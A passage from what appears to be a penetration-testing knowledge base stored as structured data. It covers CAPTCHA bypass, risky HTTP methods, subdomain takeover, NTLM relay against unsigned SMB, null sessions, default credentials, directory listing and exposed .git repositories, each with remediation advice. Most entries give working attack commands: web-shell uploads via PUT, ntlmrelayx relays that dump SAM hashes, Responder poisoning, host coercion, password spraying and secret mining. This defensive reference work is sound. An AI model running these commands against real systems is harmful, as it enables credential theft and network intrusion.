            "Review bucket ACLs and policies for wildcards (Principal: * / AllUsers / AuthenticatedUsers) and remove them.",
            "Serve user uploads from a separate, non-executable origin and validate content types so a poisoned object cannot run as script.",
            "Enable access logging and monitoring so anonymous access attempts are visible."
          ]}
        ]
      },
      {
        "id": "captcha-bypass",
        "name": "CAPTCHA Weaknesses & Bypass",
        "severity": "Low",
        "ref": "https://owasp.org/www-project-automated-threats-to-web-applications/",
        "description": "A CAPTCHA meant to stop automation can be replayed, removed, solved, or side-stepped, leaving the protected action open to abuse.",
        "brief": "CAPTCHAs exist to stop automated abuse of an action - mass account creation, credential stuffing, email flooding, brute force. They fail in predictable, implementation-level ways rather than by breaking the image itself. Common weaknesses: the token is not invalidated after one use, so a single solved value can be replayed forever; validation happens only in the browser, so blocking or removing the CAPTCHA parameter lets the request through; the check is wired to one method or content-type but not another; or the challenge is weak enough for OCR/solver services.\n\nThe CAPTCHA is rarely the real prize - it is the gate in front of a valuable action. A bypass matters because of what it unlocks, so the impact is judged by the protected function (account creation, login, password reset, mail sending), not by the CAPTCHA alone.",
        "quickReference": [
          { "label": "Replay a solved token", "cmd": "submit a valid captcha value twice - is the second request accepted?" },
          { "label": "Remove the parameter", "cmd": "strip the captcha field entirely and send the request" },
          { "label": "Change the method / type", "cmd": "POST -> GET, or JSON -> form-encoded, to hit a handler that skips the check" },
          { "label": "Solve it", "cmd": "run weak text captchas through an OCR/solver to defeat anti-automation" }
        ],
        "sections": [
          { "title": "How It's Tested", "type": "commands", "commands": [
            { "label": "1. Test token reuse", "cmd": "# solve once, capture the value, then replay it on repeated requests\n# also try the same value paired with its original session id" },
            { "label": "2. Test server-side enforcement", "cmd": "# remove the captcha parameter, send an empty value, or block the\n# captcha script/image from loading - does the action still succeed?" },
            { "label": "3. Test alternate paths", "cmd": "# resend as GET instead of POST; re-encode JSON as form data\n# a second handler may never validate the captcha" },
            { "label": "4. Test the challenge strength", "cmd": "# feed the image to OCR / a solver; request the image by direct URL\n# to see if the answer is predictable or repeated" }
          ]},
          { "title": "Weakness -> Bypass", "type": "table", "columns": ["Weakness", "Bypass"], "rows": [
            ["Token not invalidated", "Replay one solved value indefinitely"],
            ["Client-side only", "Remove/empty the parameter, or block the widget"],
            ["Per-handler validation", "Switch method or content-type"],
            ["Weak image", "OCR / automated solver"],
            ["Predictable/reused image", "Request by path; map image to known answer"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP - Automated Threats to Web Applications", "url": "https://owasp.org/www-project-automated-threats-to-web-applications/" },
            { "label": "OWASP - Blocking Brute Force Attacks", "url": "https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Validate the CAPTCHA server-side on every path to the protected action, and reject the request when the token is missing, empty, or malformed.",
            "Invalidate each token immediately after a single verification and bind it to the session and a short expiry.",
            "Use a modern, well-maintained CAPTCHA service instead of home-grown text images that OCR defeats.",
            "Do not rely on the CAPTCHA alone - add server-side rate limiting and monitoring on the underlying action (login, registration, mail).",
            "Ensure every method and content-type for the endpoint enforces the same check."
          ]}
        ]
      },
      {
        "id": "dangerous-http-methods",
        "name": "Dangerous HTTP Methods",
        "severity": "Medium",
        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
        "description": "The server allows risky HTTP methods (PUT, DELETE, TRACE, CONNECT) that can upload/delete files or enable cross-site attacks.",
        "brief": "Web servers support methods beyond GET and POST. Left enabled without proper authorisation, PUT may let an attacker upload files (including a web shell), DELETE may remove them, and TRACE enables Cross-Site Tracing (XST) to read headers a victim's browser would not otherwise expose. CONNECT can turn the server into a proxy. Many of these are configuration defaults that serve no purpose for the application.\n\nImpact: file upload leading to remote code execution (PUT), destructive deletion (DELETE), credential/cookie exposure (TRACE/XST), and open-proxy abuse (CONNECT).",
        "quickReference": [
          { "label": "List allowed methods", "cmd": "curl -s -i -X OPTIONS https://target/  | grep -i allow" },
          { "label": "Test PUT (file upload)", "cmd": "curl -i -X PUT https://target/shell.txt -d 'pwned'  ->  then GET it back" },
          { "label": "Test DELETE", "cmd": "curl -i -X DELETE https://target/uploads/test.txt" },
          { "label": "Test TRACE (XST)", "cmd": "curl -i -X TRACE https://target/  (echoes the request - XST if reflected)" }
        ],
        "sections": [
          { "title": "How It's Tested", "type": "commands", "commands": [
            { "label": "1. Enumerate the allowed methods", "cmd": "curl -s -i -X OPTIONS https://target/ | grep -i '^allow'\nnmap --script http-methods -p 80,443 target" },
            { "label": "2. Try to upload with PUT", "cmd": "curl -i -X PUT https://target/poc.html -H 'Content-Type: text/html' -d '<h1>poc</h1>'\ncurl -s https://target/poc.html   # served back? potential RCE with an executable extension" },
            { "label": "3. Try DELETE and TRACE", "cmd": "curl -i -X DELETE https://target/poc.html      # destructive test - use with authorisation\ncurl -i -X TRACE https://target/                # request echoed = XST possible" }
          ]},
          { "title": "Methods & Risk", "type": "table", "columns": ["Method", "Risk if enabled"], "rows": [
            ["PUT", "Upload arbitrary files -> web shell / RCE"],
            ["DELETE", "Remove files -> defacement / denial of service"],
            ["TRACE", "Cross-Site Tracing (XST) - read otherwise-hidden headers/cookies"],
            ["CONNECT", "Use the server as an open proxy"],
            ["OPTIONS", "Not dangerous itself, but discloses the method list"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP WSTG - Test HTTP Methods", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" },
            { "label": "OWASP - Cross Site Tracing", "url": "https://owasp.org/www-community/attacks/Cross_Site_Tracing" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Disable every method the application does not need - typically leave only GET, POST, and HEAD (plus PUT/DELETE only where a REST API requires them, with authorisation).",
            "Disable TRACE and CONNECT at the web server entirely.",
            "Enforce authentication and authorisation on any state-changing method rather than relying on it being 'hidden'.",
            "Confirm the change on every host and virtual host, since method configuration is often per-server."
          ]}
        ]
      },
      {
        "id": "subdomain-takeover",
        "name": "Subdomain Takeover",
        "severity": "High",
        "ref": "https://github.com/EdOverflow/can-i-take-over-xyz",
        "description": "A DNS record still points at a third-party service that has been de-provisioned, so an attacker can register that service and serve their own content from the trusted subdomain.",
        "brief": "A subdomain takeover happens when a CNAME (or A/NS) record points at an external service — a cloud host, CDN, SaaS page, or storage bucket — that no longer has the resource claimed. The DNS entry is left dangling: it still resolves, but the provider returns an 'unclaimed / not found' state. Anyone who can register that resource on the same provider then controls whatever the subdomain serves.\n\nImpact ranges from convincing phishing and malware hosting on a trusted hostname to stealing cookies scoped to the parent domain, bypassing CORS/CSP allow-lists, and hijacking OAuth redirects — the browser still trusts app.target.com even though a stranger now owns it.",
        "quickReference": [
          { "label": "Find the dangling CNAME", "cmd": "dig CNAME app.target.com +short\n# -> points at an external provider (e.g. s3.amazonaws.com, github.io)" },
          { "label": "Read the fingerprint", "cmd": "curl -s https://app.target.com | grep -i 'no such\\|not found\\|no bucket\\|there isn'" },
          { "label": "Bulk-scan a subdomain list", "cmd": "subzy run --targets subs.txt\nnuclei -l subs.txt -t http/takeovers/" },
          { "label": "Confirm what is claimable", "cmd": "check  can-i-take-over-xyz  for per-provider takeover status" }
        ],
        "sections": [
          { "title": "How It's Observed", "type": "commands", "commands": [
            { "label": "1. List the subdomains and their DNS targets", "cmd": "dig CNAME app.target.com +short\n# a live subdomain whose CNAME points at an external provider is the candidate" },
            { "label": "2. Check whether the target resource is unclaimed", "cmd": "curl -sI https://app.target.com        # status code + Server header\ncurl -s  https://app.target.com | head    # look for a provider 'not found' page" },
            { "label": "3. Match the response against a known fingerprint", "cmd": "# AWS S3:        NoSuchBucket\n# GitHub Pages:  There isn't a GitHub Pages site here\n# Heroku:        No such app\n# Azure:         404 Web Site not found\n# a matching fingerprint on a host that still resolves = takeover candidate" }
          ]},
          { "title": "Testing Steps", "type": "commands", "commands": [
            { "label": "1. Collect every subdomain and its CNAME (see Recon)", "cmd": "subfinder -d target.com -all -silent | httpx -silent -cname -o live_cnames.txt" },
            { "label": "2. Flag dangling records automatically", "cmd": "subzy run --targets live_cnames.txt --hide_fails\nnuclei -l subs.txt -t http/takeovers/          # ProjectDiscovery takeover templates" },
            { "label": "3. Verify manually before acting", "cmd": "dig CNAME <candidate> +short                 # confirm it still points at the service\ncurl -s https://<candidate>                    # confirm the unclaimed fingerprint" },
            { "label": "4. Prove impact (with written authorisation only)", "cmd": "# register the resource on the SAME provider the CNAME points to\n# (e.g. create the S3 bucket / GitHub Pages repo / Heroku app of that exact name),\n# publish a harmless proof file, then load https://<candidate>/proof.txt\n# never host malicious content — a benign PoC page is enough to demonstrate the issue" }
          ]},
          { "title": "Common Vulnerable Services", "type": "table", "columns": ["Service", "Unclaimed fingerprint"], "rows": [
            ["AWS S3", "'The specified bucket does not exist' / NoSuchBucket"],
            ["GitHub Pages", "\"There isn't a GitHub Pages site here.\""],
            ["Heroku", "'No such app' / default Heroku error page"],
            ["Azure (cloudapp / trafficmanager / blob)", "'404 Web Site not found'"],
            ["Fastly", "'Fastly error: unknown domain'"],
            ["Shopify / Zendesk / Tumblr / Surge", "provider 'not found' or closed-page fingerprint"]
          ]},
          { "title": "Why It Matters", "type": "table", "columns": ["Abuse", "Impact"], "rows": [
            ["Phishing on a trusted host", "Credential harvesting that survives eye and URL checks"],
            ["Cookie theft", "Reading or setting cookies scoped to *.target.com"],
            ["CORS / CSP allow-list bypass", "The subdomain is already trusted by the main app's policy"],
            ["OAuth redirect hijack", "Stealing tokens if the host is a whitelisted redirect_uri"],
            ["Malware / defacement", "Serving attacker content under the organisation's brand"]
          ]},
          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Use"], "rows": [
            ["subfinder / amass", "Enumerate the subdomains to test"],
            ["httpx", "Resolve, probe, and print the CNAME of every live host"],
            ["nuclei (http/takeovers)", "Template-based detection at scale"],
            ["subzy / subjack", "Fingerprint dangling records against known services"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "can-i-take-over-xyz — per-service takeover status", "url": "https://github.com/EdOverflow/can-i-take-over-xyz" },
            { "label": "OWASP WSTG — Test for Subdomain Takeover", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Remove the DNS record the moment the service it points to is decommissioned — make DNS cleanup part of every teardown.",
            "Audit CNAME, A, and NS records regularly for targets that no longer resolve to a claimed resource.",
            "Claim the resource before creating the DNS record, and delete the DNS record before releasing the resource, so a dangling window never exists.",
            "Prefer provider features that bind a hostname to your account (verified custom domains) so the name cannot be re-registered by anyone else.",
            "Monitor continuously with automated takeover scanning in CI or an external attack-surface management tool."
          ]}
        ]
      },
      {
        id: "smb-signing-disabled",
        name: "SMB Signing Not Required",
        severity: "High",
        ref: "https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Hosts that do not require SMB signing can be targeted by NTLM relay, turning a captured authentication into access.",
        brief: "SMB signing cryptographically signs SMB sessions so a man-in-the-middle cannot tamper with or relay them. When it is not required (the default on non-DC Windows for years), a host becomes a valid NTLM relay target: an attacker who coerces or poisons an authentication forwards it to that host and acts as the victim.\n\nImpact: lateral movement, SAM/LSA dumping, and command execution on every unsigned host — one of the most common and impactful internal misconfigurations, because it converts everyday name-resolution noise into access.",
        quickReference: [
          { label: "Find hosts without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
          { label: "Check a single host", cmd: "netexec smb 10.0.0.5   (look for signing:False)" },
          { label: "Exploit via relay", cmd: "ntlmrelayx.py -tf targets.txt -smb2support -i" },
          { label: "nmap", cmd: "nmap --script smb2-security-mode -p445 <host>" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate hosts that do not require signing", cmd: "netexec smb 10.0.0.0/24                 # note signing:False in the banner\nnetexec smb 10.0.0.0/24 --gen-relay-list targets.txt   # collect relay targets\nnmap --script smb2-security-mode -p445 10.0.0.0/24      # cross-check" },
              { label: "2. Start the relay against the unsigned targets", cmd: "# tell Responder NOT to answer SMB/HTTP so relay can (Responder.conf: SMB=Off, HTTP=Off)\nntlmrelayx.py -tf targets.txt -smb2support -i\n# -i drops an interactive SMB client per successful relay; -c '<cmd>' to run a command" },
              { label: "3. Generate the authentication to relay", cmd: "# poison name resolution (see LLMNR/NBT-NS) or coerce a host:\nresponder -I eth0 -wd                    # capture stray auth\ncoercer coerce -u user -p pass -t 10.0.0.9 -l ATTACKER   # force DC/host to auth" },
              { label: "4. Act on the relayed session", cmd: "# ntlmrelayx with -c runs directly; or use the -i socks:\nntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'\nntlmrelayx.py -tf targets.txt -smb2support --dump-sam    # dump SAM on the target" },
              { label: "5. Escalate", cmd: "# relay a coerced DC computer account or admin to escalate:\n# combine with RBCD or ADCS (ESC8) relay for domain impact" }
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["NetExec", "The SMB banner shows signing:True/False per host; --gen-relay-list collects the vulnerable ones"],
              ["nmap", "smb2-security-mode reports whether signing is required, enabled, or disabled"],
              ["Scope", "DCs require signing by default; member servers and workstations usually do not"],
              ["Pair with", "LLMNR/NBT-NS poisoning or coercion to generate the authentication to relay"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Scan for signing:False hosts", "Relay target list"],
              ["2", "Start ntlmrelayx against them", "Relay listener ready"],
              ["3", "Poison / coerce an authentication", "Victim auth arrives"],
              ["4", "Relay to the unsigned host", "SAM dump / command execution"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["NetExec", "Enumerate signing state and build the relay list"],
              ["Impacket ntlmrelayx", "Perform the NTLM relay and post-exploitation"],
              ["Responder", "Poison name resolution to capture authentications"],
              ["Coercer / PetitPotam", "Coerce a host into authenticating"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "BHIS — SMB Relay Race", url: "https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/" },
              { label: "The Hacker Recipes — NTLM relay", url: "https://www.thehacker.recipes/ad/movement/ntlm/relay" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require SMB signing via Group Policy on all systems — 'Microsoft network server: Digitally sign communications (always)'.",
              "Also require signing on clients so they refuse unsigned sessions.",
              "Disable LLMNR and NBT-NS to remove the easiest way to obtain the authentication to relay.",
              "Enforce SMB signing and channel binding together as part of a relay-hardening baseline.",
              "Verify with a relay-list scan after rollout — the vulnerable-host list should be empty."
            ]
          }
        ]
      },
      {
        id: "null-session",
        name: "Anonymous / Null Sessions",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1087/",
        description: "Unauthenticated SMB/RPC or LDAP access leaks users, groups, shares, and the password policy.",
        brief: "A null (anonymous) session is unauthenticated access to a Windows host's SMB/RPC interfaces, historically allowing enumeration of users, groups, shares, and the password policy without any credential. Anonymous LDAP binds are the directory equivalent.\n\nImpact: the leaked usernames, lockout policy, and share names are the groundwork for password spraying and further attacks. Modern Windows locks most of this down, but legacy configurations and misconfigured services still expose it.",
        quickReference: [
          { label: "Null SMB enumeration", cmd: "enum4linux-ng -A -u '' -p '' <host>" },
          { label: "NetExec null check", cmd: "netexec smb <host> -u '' -p '' --shares --users --pass-pol" },
          { label: "RID cycling", cmd: "netexec smb <host> -u '' -p '' --rid-brute" },
          { label: "Anonymous LDAP bind", cmd: "ldapsearch -x -H ldap://<dc> -b \"DC=corp,DC=local\"" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Try an empty credential over SMB", cmd: "netexec smb <host> -u '' -p '' --shares --users --pass-pol\nnetexec smb <host> -u 'guest' -p '' --shares      # guest may also be enabled\n# any returned data = null/guest access" },
              { label: "2. Full anonymous enumeration", cmd: "enum4linux-ng -A -u '' -p '' <host>\n# pulls users, groups, shares, password policy, and the domain SID in one pass" },
              { label: "3. RID cycling when direct listing is blocked", cmd: "netexec smb <host> -u '' -p '' --rid-brute 4000\n# walks the domain SID (S-1-5-21-...-500,501,1000...) to enumerate accounts\n# recovers usernames even when SAMR enumeration is denied" },
              { label: "4. Anonymous LDAP bind", cmd: "ldapsearch -x -H ldap://<dc> -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName\n# an unauthenticated bind that returns directory objects" },
              { label: "5. Turn the leak into an attack", cmd: "# build a user list + read the lockout policy, then spray safely below the threshold:\nnetexec smb <dc> -u users.txt -p 'Winter2026!' --continue-on-success" }
            ]
          },
          {
            title: "What It Leaks",
            type: "table",
            columns: ["Data", "Use"],
            rows: [
              ["Usernames", "Build a spray/roast list"],
              ["Password policy", "Lockout threshold and window — the safe spray rate"],
              ["Shares", "Discover readable shares and their contents"],
              ["Groups", "Identify privileged group membership"],
              ["Domain SID", "Enables RID cycling to enumerate accounts when direct listing is blocked"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Send an empty credential", "Confirm anonymous access"],
              ["2", "Enumerate users + policy (or RID cycle)", "Username list + lockout policy"],
              ["3", "Read accessible shares", "Config/secret discovery"],
              ["4", "Password-spray within policy", "Valid credentials"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["enum4linux-ng", "Comprehensive anonymous SMB/RPC enumeration"],
              ["NetExec", "Null checks, --rid-brute, share/user/policy enumeration"],
              ["ldapsearch", "Test and query anonymous LDAP binds"],
              ["rpcclient", "Manual RPC enumeration over a null session"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK — Account Discovery (T1087)", url: "https://attack.mitre.org/techniques/T1087/" },
              { label: "The Hacker Recipes — SMB enumeration", url: "https://www.thehacker.recipes/ad/recon/nmap" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Restrict anonymous access: set RestrictAnonymous / RestrictAnonymousSAM and 'Network access: Do not allow anonymous enumeration of SAM accounts and shares'.",
              "Disable anonymous LDAP binds on domain controllers.",
              "Disable the guest account and audit legacy hosts that still permit null sessions.",
              "Remove unnecessary shares and lock down share/NTFS permissions.",
              "Since usernames still leak by other means, pair this with a strong lockout policy and MFA."
            ]
          }
        ]
      },
      {
        id: "default-credentials",
        name: "Default Credentials",
        severity: "High",
        ref: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        description: "Devices, panels, and services left on vendor-default or well-known credentials grant instant access.",
        brief: "Default credentials are the factory or documented username/password pairs shipped with software, appliances, and services. When they are never changed, anyone who knows the vendor default — and they are all published — logs straight in.\n\nImpact: instant, often highest-privilege access to admin panels, routers, printers, databases, and management interfaces. It is unglamorous and extremely common, frequently providing the best foothold on a network for zero effort.",
        quickReference: [
          { label: "Classic pairs", cmd: "admin/admin  admin/password  root/root  sa/(blank)  tomcat/tomcat" },
          { label: "Product examples", cmd: "Jenkins, Grafana admin/admin; Tomcat manager; iDRAC/iLO; DB defaults" },
          { label: "Spray defaults across a service", cmd: "netexec <proto> <targets> -u users.txt -p defaults.txt --no-bruteforce" },
          { label: "References", cmd: "Vendor manuals, SecLists Default-Credentials, DefaultCreds-cheat-sheet" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Fingerprint the product", cmd: "whatweb https://target        # identify the software + version\nnuclei -u https://target -tags tech    # tech detection\n# knowing the product tells you which default to try" },
              { label: "2. Look up the documented default", cmd: "# consult vendor docs / default-credential databases:\n#   SecLists/Passwords/Default-Credentials, DefaultCreds-cheat-sheet\n# e.g. Grafana admin/admin, Tomcat tomcat/tomcat, RabbitMQ guest/guest" },
              { label: "3. Test the top pairs (mind lockouts)", cmd: "# web panel: try the documented pair in the login form\n# services, non-destructively:\nnetexec ssh 10.0.0.0/24 -u root -p 'toor' --no-bruteforce\nnetexec mssql <host> -u sa -p '' \n# --no-bruteforce pairs the i-th user with the i-th password only" },
              { label: "4. Automate across many products", cmd: "nuclei -u https://target -tags default-login\n# default-logins/ templates try known product defaults automatically" },
              { label: "5. Confirm and use the access", cmd: "# log in; e.g. Tomcat manager -> deploy a WAR web shell,\n# Jenkins -> script console RCE, iDRAC/iLO -> virtual media / console" }
            ]
          },
          {
            title: "Where to Look",
            type: "table",
            columns: ["Target", "Common defaults"],
            rows: [
              ["Web admin panels", "admin/admin, admin/password, product-specific pairs"],
              ["App servers", "Tomcat manager (tomcat/tomcat), JBoss, WebLogic consoles"],
              ["Databases", "sa with blank password (MSSQL), root with no password (MySQL/Mongo)"],
              ["Management interfaces", "iDRAC/iLO/IPMI, switches, routers, printers, cameras"],
              ["Dev/monitoring tools", "Jenkins, Grafana, Kibana, RabbitMQ (guest/guest)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Fingerprint the product", "Known default to try"],
              ["2", "Look up the vendor default", "Candidate credential pair"],
              ["3", "Log in with the default", "Authenticated access"],
              ["4", "Abuse the panel's features", "RCE / data / pivot"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["WhatWeb / Nuclei", "Fingerprint products and run default-login templates"],
              ["NetExec", "Test default pairs across SMB/SSH/MSSQL/WinRM/etc."],
              ["SecLists / DefaultCreds-cheat-sheet", "Authoritative default-credential lists"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Security Misconfiguration (A05:2021)", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
              { label: "DefaultCreds-cheat-sheet", url: "https://github.com/ihebski/DefaultCreds-cheat-sheet" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Change every default credential before a system goes into service; make it a deployment checklist item.",
              "Enforce a strong-password policy and MFA on management and admin interfaces.",
              "Do not expose management interfaces to untrusted networks; segment and firewall them.",
              "Inventory devices and scan periodically with default-credential checks (Nuclei default-logins).",
              "Disable or remove unused default/sample accounts entirely."
            ]
          }
        ]
      },
      {
        id: "directory-listing",
        name: "Directory Listing Enabled",
        severity: "Low",
        ref: "https://owasp.org/www-community/vulnerabilities/Directory_Indexing",
        description: "The web server auto-indexes folders without an index file, exposing files that were never meant to be browsable.",
        brief: "When a web server auto-generates a listing for directories that lack an index file, it reveals every file in that folder — including backups, source, config, uploads, and old versions that were never linked and were assumed hidden.\n\nImpact: low by itself, but it routinely exposes serious findings — credentials in a stray config, a database dump, or source code. The fix is simply to disable automatic indexing.",
        quickReference: [
          { label: "Spot it", cmd: "Page titled 'Index of /' with a file listing" },
          { label: "Dork for it", cmd: "site:target.com intitle:\"index of\"" },
          { label: "Probe common dirs", cmd: "/uploads/  /backup/  /files/  /.git/  /assets/  /tmp/" },
          { label: "Scan", cmd: "nuclei -tags exposure; or content discovery with feroxbuster" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Find directories with content discovery", cmd: "feroxbuster -u https://target -w raft-medium-directories.txt\nffuf -u https://target/FUZZ -w directory-list.txt\n# note any directory that returns a listing rather than 403/index page" },
              { label: "2. Confirm auto-indexing", cmd: "curl -s https://target/uploads/ | grep -i 'Index of'\n# an 'Index of /uploads' page = directory listing enabled" },
              { label: "3. Harvest the exposed files", cmd: "# browse the listing for high-value files:\n/backup/  -> site.zip, db.sql, *.bak\n/config/  -> .env, config.php\n/uploads/ -> other users' documents\ncurl -sO https://target/backup/db.sql" },
              { label: "4. Search-engine shortcut", cmd: "# find indexed listings without touching the target:\nsite:target.com intitle:\"index of\"\nsite:target.com intitle:\"index of\" (backup OR sql OR env)" },
              { label: "5. Loot the findings", cmd: "# pull secrets/source from what the listing revealed, then use them\n# (see Exposed Secrets and Exposed .git/Source & Backups)" }
            ]
          },
          {
            title: "What It Exposes",
            type: "table",
            columns: ["Content", "Risk"],
            rows: [
              ["Backups", ".bak, .zip, .tar.gz of the site or database"],
              ["Source & config", "Code, .env, config files with secrets"],
              ["Uploads", "User files, sometimes other users' documents"],
              ["Old versions", "Deprecated pages/endpoints still reachable"],
              ["Internal notes", "READMEs, TODOs, and paths that inform further attacks"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Discover directories", "Candidate folders"],
              ["2", "Confirm auto-indexing", "Browsable listing"],
              ["3", "Enumerate the listed files", "Backups/config/source found"],
              ["4", "Extract secrets/source", "Escalated access"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["feroxbuster / ffuf", "Directory discovery to find listable folders"],
              ["Nuclei / Nikto", "Flag directory indexing and exposed files"],
              ["Search engines (dorks)", "Locate already-indexed listings passively"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Directory Indexing", url: "https://owasp.org/www-community/vulnerabilities/Directory_Indexing" },
              { label: "OWASP WSTG — Review Webserver Metafiles / Directory Listing", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable automatic directory indexing (Options -Indexes in Apache; autoindex off in nginx; disable directory browsing in IIS).",
              "Do not store backups, source, or config anywhere under the web root.",
              "Add an index file or explicit deny rules to sensitive directories.",
              "Review what is web-accessible and remove stray files; treat any exposed secret as compromised.",
              "Scan periodically for indexing and exposed files as part of monitoring."
            ]
          }
        ]
      },
      {
        id: "exposed-source-backups",
        name: "Exposed .git / Source & Backups",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code",
        description: "A deployed .git folder, backup archive, or editor swap file lets an attacker reconstruct source and extract secrets.",
        brief: "Deploying a site with its version-control metadata or leaving backups under the web root exposes the application's source. A reachable /.git/ directory can be downloaded and the full repository — including secrets in old commits — reconstructed. Backup archives, editor swap/temp files, and .DS_Store listings do the same.\n\nImpact: full source disclosure (to find further bugs) and, very often, hardcoded credentials from history — frequently a direct path to deeper compromise.",
        quickReference: [
          { label: "Detect exposed git", cmd: "curl -s https://target.com/.git/HEAD   (returns 'ref: refs/heads/...')" },
          { label: "Dump the repo", cmd: "git-dumper https://target.com/.git ./out   (then git log -p for secrets)" },
          { label: "Backup/temp files", cmd: "/backup.zip  /db.sql  /index.php.bak  /.env  /config.php~  /.DS_Store" },
          { label: "Other VCS/CI", cmd: "/.svn/  /.hg/  /.gitignore  /.git/config  exposed CI files" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Probe for an exposed repository", cmd: "curl -s https://target/.git/HEAD          # 'ref: refs/heads/main' = exposed\ncurl -s https://target/.git/config        # remote URL, more confirmation\ncurl -s https://target/.svn/entries       # SVN variant" },
              { label: "2. Reconstruct the full repo", cmd: "git-dumper https://target/.git ./loot\ncd loot && git log --oneline               # full history recovered\n# works even without directory listing, by walking git objects" },
              { label: "3. Mine history for secrets", cmd: "cd loot\ngit log -p | grep -iE 'password|api[_-]?key|secret|token'\ntrufflehog git file://./ --json\ngitleaks detect -s ./ -v                    # secrets in current + old commits" },
              { label: "4. Guess backup / temp artifacts", cmd: "for f in backup.zip db.sql index.php.bak .env config.php~ .DS_Store; do\n  curl -s -o /dev/null -w \"%{http_code} $f\\n\" https://target/$f; done\n# 200 -> download and inspect" },
              { label: "5. Use the recovered source/secrets", cmd: "# read the code to find logic bugs and endpoints;\n# use any recovered DB/cloud/API credential directly against the backend" }
            ]
          },
          {
            title: "Exposure Types",
            type: "table",
            columns: ["Artifact", "What it yields"],
            rows: [
              [".git directory", "Full source and history — reconstruct with git-dumper, then mine commits for secrets"],
              ["Backup archives", ".zip/.tar.gz/.bak/.sql of the app or database"],
              ["Editor artifacts", "vim .swp, file~ , .orig — recover source of a single file"],
              [".DS_Store", "Directory listings that reveal otherwise-unknown filenames"],
              ["Env/config", ".env, config.php, appsettings.json with credentials"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Probe /.git/HEAD or backup names", "Confirm exposure"],
              ["2", "git-dumper the repository", "Full source + history"],
              ["3", "Scan history for secrets", "Credentials / keys"],
              ["4", "Use source + secrets", "Deeper compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["git-dumper", "Reconstruct a repository from an exposed /.git/"],
              ["trufflehog / gitleaks", "Find secrets across current and historical commits"],
              ["feroxbuster / Nuclei", "Discover backup/temp artifacts and exposure"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Information exposure through source code", url: "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code" },
              { label: "git-dumper", url: "https://github.com/arthaud/git-dumper" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never deploy version-control metadata; exclude .git/.svn from the build/deploy artifact, and block them at the web server.",
              "Keep backups, dumps, and source archives outside the web root entirely.",
              "Configure the server to deny dotfiles and known backup/temp extensions.",
              "Rotate any secret that was ever committed — removing the file does not remove it from history.",
